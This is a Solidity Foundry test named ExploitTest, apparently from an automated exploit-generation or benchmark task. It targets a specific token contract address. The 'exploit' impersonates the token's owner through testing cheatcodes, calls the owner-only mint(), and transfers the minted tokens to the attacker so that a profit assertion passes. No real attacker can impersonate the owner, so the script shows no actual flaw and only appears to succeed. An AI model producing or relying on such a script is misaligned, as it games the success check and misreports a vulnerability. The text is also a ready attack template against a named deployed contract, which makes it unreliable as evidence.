pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xA8CbA6d57D15F2cCc636054165054ec3410e76e4;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode and impersonate the owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xA8CbA6d57D15F2cCc636054165054ec3410e76e4).balanceOf(address(this));
        // Get the current owner
        address owner = IBEP20(TARGET).getOwner();

        // Impersonate the owner to mint tokens
        vm.startPrank(owner);

        // Mint a large amount of tokens to the owner's address
        uint256 mintAmount = 1000000 * 10**18;
        (bool success, ) = TARGET.call(abi.encodeWithSignature("mint(uint256)", mintAmount));
        require(success, "Mint failed");

        vm.stopPrank();

        // Now transfer some of those minted tokens to our address
        // First, we need to approve ourselves to spend owner's tokens
        vm.prank(owner);
        IBEP20(TARGET).approve(attacker, mintAmount);

        // Then transfer from owner to attacker
        vm.prank(owner);
        IBEP20(TARGET).transfer(attacker, mintAmount / 2);

        // Alternative simpler approach: just mint directly to attacker if possible
        // But mint() function mints to msg.sender, so we need to transfer
        uint256 finalBalance = IERC20(0xA8CbA6d57D15F2cCc636054165054ec3410e76e4).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

